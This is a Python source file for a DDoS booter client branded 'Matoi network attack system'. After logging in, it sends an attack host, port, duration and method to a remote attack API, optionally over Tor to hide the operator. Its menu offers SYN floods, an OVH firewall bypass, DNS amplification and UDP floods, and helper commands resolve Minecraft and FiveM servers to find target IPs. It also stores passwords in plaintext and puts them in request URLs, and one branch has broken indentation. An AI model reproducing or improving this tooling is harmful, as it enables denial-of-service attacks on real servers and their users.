

from colorama import Fore, Back, Style
from pystyle import Colors, Colorate
import importlib.util
import threading
import os
import pwinput
from libs.fivem import resolve_cfx_url
from mcstatus import JavaServer
import subprocess
import time


userinfobanner = Colorate.Horizontal(Colors.red_to_blue, """::..-%===%%%%%*+++*####**+++++++++++++***############%%%*-::::::::::::
::::+%+%%%%#++++++++++++++++++++++****************###############*::::
...+%%%%%%++++++++++++****#####################################+::::::
..=%%@%%*++**++++**########################################%*:::::::::
..%%%%%**##***################################################+:::::::
.*%%#%########################%#######*#########################:..::.
-%%%%###############**#######=######*:*#####%####################-.::.
##%%###############==######--#####=::*##*-##%#####################=.--
##%%%############=::####*-:+##*-::::*#=::::*#+*####################+.-
##%%%##########+:::###-::::::::::::::::::::::-:-###############%####--
##%##########=:::::::::::::::::::::::::::::::::::###############--###=
##%%#######::=+-:::::-+=-::::::::::::::::::::::-::=#############+:.=#+
##%%######*+-::::::::::::-*-:::::::::::=+=-:::::::###############::.:+
##%%#######:::-+**=::::::::-*::::::==-:::::::::::-%##############---:-
###%%#####*@@@%%#**#@@#::::::::::::::::::=%@@@@@@@%#########=*###=:-==
*##%%###@%%%%:..*@@@%%%=+-::::::::::::+%@@@%:..=%@@%%%#####+-=+##=::--
+##=:####%@#...#@@%%%%@@=.+:::::::::+*%%%%@@@+...-@@%###*%+-===*#+====
+%%:=+####@*...@%%%%%%@@*.:::::::::-.#@@%@%@@%....=%%##*:*+===++#+====
%##::-####%%...-%%%%%@@%=.:::::::::..#@@@%@@@#....=%###=:=+===========
###=::*####%#....=%%%%*...::::::::::..+%%%%%+....:%####=:+========----
###%::+#####%%+..........::::::::::::...........-%#####==+=====--=+=--
%%#%%-+%#####=:-++---=-:::::::-==::::::::....:=#%%%##%#+*==========++=
+%%%%%%%%##%%#::::::::::::::::::::::::::::::::::=%%%%%#%#=======--::-=
=%%%%%%%%#%%%#-:::::::::::::::::::::::::::::::::=%%%%%#%%#*======-----
%%%%%%%%%%%%%#::::::::::::::::::::::::::::::::::#%%%%%%#*=======++++++
=*###%%%%%%%%%+:::::::::::::::::::::::::::::::-%%%%%%#*===============
======#%%%%%#%%%+::::::::::+*++-::::::::::::-#%%#%%%#%*===============
=====#%%%%%%%%%%%%#+:::::::=+++=:::::::::-*%%%###@%%##*+==============
====+##%%%%%%%###%####=+-::::::::::-+#%%%%%%%%%#%#+=============------
""")

attackbanner = Colorate.Horizontal(Colors.red_to_yellow, """            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣯⡉⠉⠉⠉⠉⠛⠛⠻⢿⣟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⡿⠿⠛⠛⠂⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠈⠙⢿⣿⡿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣤⣤⠄⠀⠄⠀⠀⠀⠀⠀⠀⡠⠀⡄⠀⡀⠀⠀⠀⠉⢀⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⡿⠁⢀⠊⠀⢀⡞⠁⠀⣠⠾⠃⢀⣧⠀⡷⡀⠈⡄⠀⠈⠉⣩⣿⣿⣿⣿
            ⣿⣿⣿⠁⠀⠘⠀⣠⣟⣤⣶⣿⡕⣁⡠⢾⣸⣠⣇⣵⣄⢱⠀⠀⠀⢿⣿⣿⣿⣿
            ⣿⣿⣿⣶⡖⠰⢼⡑⣥⣶⣶⣮⢢⠀⠀⠈⢝⣽⣿⣿⣍⢿⠀⡄⠀⣼⣿⣿⣿⣿
            ⣿⣿⣿⣿⣃⣴⢸⢸⣿⣿⣿⣿⢾⠀⠀⢸⢸⣿⣿⣿⣿⠸⢀⢇⡀⠛⣻⣿⣿⣿
            ⣿⣿⣿⣿⣿⢲⢿⠑⠝⢛⣛⠵⠁⣀⡀⠀⣎⣛⣟⡛⠕⣷⢯⠂⢱⢾⣿⣿⣿⣿
            ⣿⣿⣿⣏⠙⢌⣺⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⣢⠐⢀⠜⡿⢿⣿⣿⣿
            ⣿⣿⣯⡈⠁⠀⣀⡱⢄⡀⠀⠀⠒⠒⠂⠀⠀⠀⣀⣠⠴⡍⡽⠁⠈⠀⠚⣿⣿⣿
            ⣿⣿⣿⣯⣉⠙⣄⠀⠀⠈⠑⠒⢤⠤⠔⠒⠚⠹⡅⢸⠀⢹⠀⠀⠀⠀⣰⣿⣿⣿
            ⣿⣿⡿⠋⠳⡤⢬⣷⡀⠀⢀⠔⠍⡓⠤⠤⠄⢒⠹⢸⠀⣀⣇⣀⠴⠊⠻⣿⣿⣿
            ⣿⢃⢄⣀⣀⣡⣰⣰⣘⣆⣎⣀⣀⣀⣉⣉⣉⣀⣀⣞⣹⣉⣍⣌⣀⣀⣀⢜⣿⣿""")

banner = Colorate.Horizontal(Colors.purple_to_blue, f"""                        ⢀⡖⠀⠈⠉⠓⠲⠦⢤⣄⣀⣀⣀⣛⣳⡶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠖⠒⠚⣛⣿⣧⣀⠀⠀⠀⠀⠀⠀⠀⢩⠉⠉⠉⠉⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⠁⣀⣤⡾⠟⠷⠾⣿⣿⣶⣦⣤⣀⡀⠀⠈⣀⣀⣠⣤⣤⣬⣿⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠴⠚⠉⠀⣀⠀⠀⠀⠀⠉⣙⠻⢾⣿⣟⡓⠶⣿⣯⠉⠁⠈⠹⣿⠃⠈⠙⠛⠶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠞⠋⣠⠴⠒⠛⠉⢡⠔⠛⠉⠉⠉⠁⠀⠀⠈⠙⠻⣶⣾⣿⣷⣄⠀⠀⢹⣧⠀⠀⠀⠀⠈⠻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠋⢁⣠⠖⠋⠁⠀⠀⠀⠀⠀⣠⣀⣤⠴⣶⡖⠋⠉⠉⠀⠀⠀⠀⠉⢿⣿⡀⠀⣬⣿⣇⠀⠀⠀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣶⣦⣤⣄⡀⢀⣀⣤⡶⠚⠋⠀⣠⡴⠋⠁⠀⠀⣠⠄⢀⣤⢴⣿⣻⢈⡿⣤⣿⣿⣷⡀⠀⢰⡆⠀⠀⠀⠀⢻⣿⣴⣾⣿⣿⡄⠀⠀⠀⠀⠀⠈⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⡟⠛⠉⠉⠀⠀⠀⣠⠞⠉⠀⢀⣤⠖⠛⣡⡞⠉⢀⡾⠃⣿⣾⡥⠛⠛⢿⣌⢳⣄⠈⢷⡀⠀⠀⠀⠀⢻⣿⣷⣿⣿⡇⠀⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣆⡀⠀⠀⣠⠞⠁⠀⣠⣶⡏⠁⢀⣼⡏⠀⣰⠟⢁⡼⠟⠉⠀⠀⠀⠀⠀⡀⠉⢷⣼⣇⠀⠀⠀⠀⠈⢻⣿⢿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠹⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣦⣘⡋⢀⣴⠞⠁⢸⡇⢀⡾⢹⢃⣴⠋⣠⠎⠀⠀⠀⠀⠀⢀⣀⣼⣇⣠⣾⡿⣿⠀⠀⠀⠀⠀⠀⢻⣧⣨⣽⣷⣄⡀⠀⠀⠀⠀⠀⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
⢿⡟⠉⠻⣿⣿⣿⡿⢻⠟⠁⠀⠀⣿⡇⣼⠃⣼⠟⠁⡼⠃⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⡇⢸⠀⠀⠀⠀⠀⠀⣸⡿⠋⠀⢀⡌⠻⣆⠀⠀⠀⠀⠘⣧⠀⠀⢀⣤⣾⠀⠀⠀⠀   
⠸⠁⠀⠀⠀⢽⡿⠁⠀⠀⠀⠀⠀⣿⢿⡇⠀⠁⠀⠐⠃⠀⢀⣾⠟⠋⡼⠻⣿⣿⣿⣿⣿⣿⣿⣾⠀⠀⠀⠀⠀⢸⠏⠀⢠⠞⠉⠀⠀⠹⡄⠀⠀⠀⠀⠛⠒⠚⠋⢁⡿⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣾⡇⠀⠀⢠⠀⠀⠀⢿⠳⡅⠀⠀⠀⠀⠀⢀⡿⠁⠀⠀⡇⣠⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⢸⢸⠀⢠⠿⢦⡀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⣸⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⠃⠀⣠⣾⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⣾⡀⠁⠀⠈⢻⡀⠀⠀⢸⣇⠀⠀⠀⠀⠀⠀⢀⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣠⡾⠻⣿⠀⠀⠀⣿⣷⣴⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠿⠿⠛⣿⡟⣿⠀⠀⠀⠀⠀⠿⣇⠀⠀⢠⡞⠀⠀⠀⢠⡏⠀⠀⠀⠀⠀⠀⠻⢤⣤⣀⣀⠀⠀
⠀⠀⠀⠀⠀⠸⠟⠁⠘⣿⠀⠀⣰⣿⢿⣿⣿⡻⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⡿⠟⠛⣧⠀⠀⠀⠀⠀⠀⢹⡀⡴⠋⠀⠀⠀⢀⡾⠃⠀⠀⣀⣀⣀⣀⣀⣀⠀⣼⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣆⣴⠟⠙⢷⣽⣿⣹⣿⡀⠀⠀⠀⠀⠀⠀⠓⠒⠶⠒⠋⠁⠀⠀⠀⠘⣧⣄⠀⠀⠀⠀⠈⣷⡄⠀⣀⣴⠶⠋⠡⣤⡔⠋⠉⠁⠀⠀⠀⣠⡾⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠏⠀⠀⠀⣈⣿⡿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣆⠀⠀⠀⠀⣸⢿⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡟⣷⠀⠀⢠⠇⢘⡇⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠞⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠀⠀⠀⠀⠀⠀⣀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠘⣧⢠⠏⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠳⣤⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣧⠀⠀⠀⠀⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⣃⣴⠟⠁⠀⠀⠀⠀⠀⠠⣤⣤⣤⠤⠴⠖⠚⠻⠆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢾⠃⠀⣠⠟⢧⣄⠀⠀⠀⠰⣶⣤⣀⣈⣻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠟⠁⢿⠀⣰⠏⠀⠀⠹⣿⣶⣤⣀⣈⣻⡍⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⠳⠤⢤⣀⣀⣀⣀⣤⡴⢾⣿⡿⠃⠀⠀⠈⢷⣏⣀⣠⡤⠶⠛⠛⠉⠙⠛⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⢀⡾⠋⠀⠀⠀⠀⠀⠈⣿⠁⢀⣤⣴⣾⠿⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣠⣿⠀⠀⠀⠀⠀⠀⠀⠀⣼⣞⡿⠞⠋⠀⢀⣀⣀⣤⡴⠞⠛⠛⠷⣤⡀⠀⠀⠈⢻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⡀⠀⠀⠀⠀⠀⣀⡴⠟⠋⣀⣤⠶⠛⢋⣵⠟⠁⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⠾⣋⣤⣶⠞⠋⠀⢀⣴⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣦⡀⠀⠙⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣟⣽⡿⠛⣩⠞⠁⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡀⠀⠘⢷⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠉⠙⠚⠋⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡇⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠉⠉⠓⢲⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⠀⠀⢸⠁⠀⠀⠀⠀⠀⠀
                        Matoi - RAMONA FLOWERS""".center(100), 1)


login2 = Fore.YELLOW + """███╗   ███╗ █████╗ ████████╗ ██████╗ ██╗
████╗ ████║██╔══██╗╚══██╔══╝██╔═══██╗██║
██╔████╔██║███████║   ██║   ██║   ██║██║
██║╚██╔╝██║██╔══██║   ██║   ██║   ██║██║
██║ ╚═╝ ██║██║  ██║   ██║   ╚██████╔╝██║
╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝
                                         """ + Fore.RESET

import requests

def start_tor():
    tor_path = "tor.exe" 
    tor_process = subprocess.Popen([tor_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(5)
    return tor_process

def tor_request(url):
    proxies = {
        'http': 'socks5://127.0.0.1:9050',
        'https': 'socks5://127.0.0.1:9050'
    }
    try:
        response = requests.get(url, proxies=proxies, timeout=30)
        return response 
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return None

def load_addon(addon_name):
    try:
        spec = importlib.util.spec_from_file_location(addon_name, f"addons/{addon_name}.py")
        addon_module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(addon_module)

        if hasattr(addon_module, 'run'):
            threading.Thread(target=addon_module.run).start()
        else:
            print(f"{Fore.RED}Addon '{addon_name}' does not have a 'run' function.{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}Failed to load addon '{addon_name}': {e}{Fore.RESET}")

def login(node, user=None, password=None):
    tor = "off"

    if os.path.exists('login.txt'):
        with open('login.txt', 'r') as file:
            credentials = file.read().strip().split(':')
            if len(credentials) == 2:
                user, password = credentials[0], credentials[1]
                os.system("cls")
                print("Using saved credentials for login.")
            else:
                os.system("cls")
                print("Invalid credentials in login.txt. Please log in manually.")
                return

    if user is None or password is None:
        os.system("cls || clear")
        print(login2)
        print("Welcome! Please login to your account, after this you will be logged autmaticaly!")
        print("")
        user = input("Enter username: ")
        password = pwinput.pwinput(prompt = 'Enter the password: ', mask='*')

    api_url = f"https://api.failed.lol/matoi/start?node={node}&user={user}&password={password}"
    
    try:
        response = requests.get(api_url)
        
        if response.status_code == 200:
            data = response.json()
            
            if "valid" in data and data["valid"]:
                print("Login successful!")
                with open('login.txt', 'w') as file:
                    file.write(f"{user}:{password}")
                clear(user, password, tor)
            else:
                print("Invalid user or incorrect credentials.")
                if os.path.exists('login.txt'):
                    os.remove('login.txt')
        else:
            print(f"Error: Received status code {response.status_code}")
    
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

def clear(user, password, tor):
    os.system("cls")
    startup(user, password, tor)

def startup(user, password, tor):
    print(Style.RESET_ALL)
    os.system("title Matoi network attack system!")
    print(banner)
    print("")
    print("")
    print("")
    main(user, password, tor)

def main(user, password, tor):
    command = input(f"{Back.MAGENTA}{user} • Matoi:{Back.RESET}{Fore.RESET} ")
    if command == "methods":
        print("")
        print(f"{Fore.RED}V {Fore.WHITE}| !tcp-syn     {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}] TCP method with syn packet for greated bypassing")
        print(f"{Fore.RED}V {Fore.WHITE}| !ovh         {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}] TCO SYN & ACK flood designed for bypass OVH firewall")
        print(f"{Fore.RED}  {Fore.WHITE}| !dns         {Fore.WHITE}[{Fore.YELLOW}PROT & UNPROT{Fore.WHITE}] DNS Amplification flood push High Gbps")
        print(f"{Fore.RED}V {Fore.WHITE}| !udplegit    {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}] Custom UDP Bypass push valid randomized data")
        print("")
        main(user, password, tor)
    if command == "help":
        print("")
        print(f"{Fore.LIGHTMAGENTA_EX}methods{Fore.RESET}   - Shows methods list           - {Fore.WHITE}D{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}attack{Fore.RESET}    - Stress test command          - {Fore.WHITE}D{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}tor{Fore.RESET}       - tor connection (on/off)      - {Fore.WHITE}D{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}testtor{Fore.RESET}   - test tor connection          - {Fore.WHITE}D{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}minecraft{Fore.RESET} - Resolve minecraft domain     - {Fore.WHITE}D{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}fivem{Fore.RESET}     - cfx resolve                  - {Fore.WHITE}D{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}plans{Fore.RESET}     - List of Plans                - {Fore.WHITE}D{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}addon{Fore.RESET}     - addons function              - {Fore.WHITE}D{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}clear{Fore.RESET}     - clears console               - {Fore.WHITE}D{Fore.RESET}")
        print("")
        main(user, password, tor)

    if command.startswith("attack"):
        parts = command.split()

        if len(parts) != 5:
            print(f"{Fore.RED}! Invalid command format. Expected: attack <host> <port> <time> <method>{Fore.RESET}")
            main(user, password, tor)
        else:
            attack, ip, port, time, method = parts
        
            os.system("cls")
            print("")
            print(attackbanner)
            print("")
            print(f"                     {Fore.LIGHTGREEN_EX}Attack sent!{Fore.RESET}")
            print(f"                     IP: {Fore.LIGHTRED_EX}{ip}{Fore.RESET}")
            print(f"                     PORT: {Fore.LIGHTRED_EX}{port}{Fore.RESET}")
            print(f"                     TIME: {Fore.LIGHTRED_EX}{time}s{Fore.RESET}")
            print(f"                     METHOD: {Fore.LIGHTRED_EX}{method}{Fore.RESET}")
            print("")

            if tor == "off":
                response = requests.get(f'https://api.failed.lol/matoi/start?node=node1&user={user}&password={password}&method={method}&time={time}&host={ip}&port={port}')

                if response.status_code == 200:
                    print(f"{Fore.LIGHTGREEN_EX}Attack request sent successfully to the server! {response.status_code} {Fore.RESET}")
                    main(user, password, tor)
                else:
                    print(f"{Fore.LIGHTRED_EX}Failed to send the attack request. Server response: {response.status_code}{Fore.RESET}")
                    main(user, password, tor)
            if tor == "on":
                response = tor_request(f'https://api.failed.lol/matoi/start?node=node1&user={user}&password={password}&method={method}&time={time}&host={ip}&port={port}')

                if response.status_code == 200:
                    print(f"{Fore.LIGHTGREEN_EX}Attack request sent successfully to the server! {response.status_code}{Fore.RESET}")
                    main(user, password, tor)
                else:
                    print(f"{Fore.LIGHTRED_EX}Failed to send the attack request, Server response: {response.status_code}{Fore.RESET}")
                    main(user, password, tor)
    elif command.startswith("addon "):
        addon_name = command.split()[1]
        load_addon(addon_name)
        main(user, password, tor)

    if command == "clear":
        clear(user, password)

    if command.startswith("fivem"):
        parts = command.split()

        if len(parts) != 2:
            print(f"{Fore.RED}! Invalid command format. Expected: fivem <cfx link>{Fore.RESET}")
            main(user, password, tor)
        else:
            fivem, cfx = parts
            url = f"{cfx}"
            target_info = resolve_cfx_url(url)
            print(target_info)
            main(user, password, tor)
    if command.startswith("minecraft"):
        parts = command.split()

        if len(parts) != 2:
            print(f"{Fore.RED}! Invalid command format. Expected: minecraft <server domain>{Fore.RESET}")
            main(user, password, tor)
        else:
            minecraft, domain = parts
            response = requests.get(f"https://api.mcstatus.io/v2/status/java/{domain}")
            if response.status_code == 200:
                data = response.json()
                print(data["ip_address"])
    if command.startswith("tor"):
        parts = command.split()

        if len(parts) != 2:
            print(f"{Fore.RED}! Invalid command format. Expected: tor <on>{Fore.RESET}")
            main(user, password, tor)
        else:
            tor, status = parts
            if status == "on":
                tor_process = start_tor()
                print("Tor started in the background.")

                url = "http://check.torproject.org"
                response = tor_request(url)
    
                if response:
                    print("Tor is working!")
                    tor = "on"
                    main(user, password, tor)
                else:
                    print("Failed to connect via Tor.")
                    main(user, password, tor)
            if status == "off":
                tor = "off"
                main(user, password, tor)
    if command == "testtor":
        url = "http://check.torproject.org"
        response = tor_request(url)
        if tor == "on":
            if response:
                print("Tor is running.")
                main(user, password, tor)
            else:
            print("Tor isnt running.")
            main(user, password, tor)
        else:
            print("Tor isnt running.")
            main(user, password, tor)
    else:
        print("Unknow command")
        main(user, password, tor)
    

login("node1")
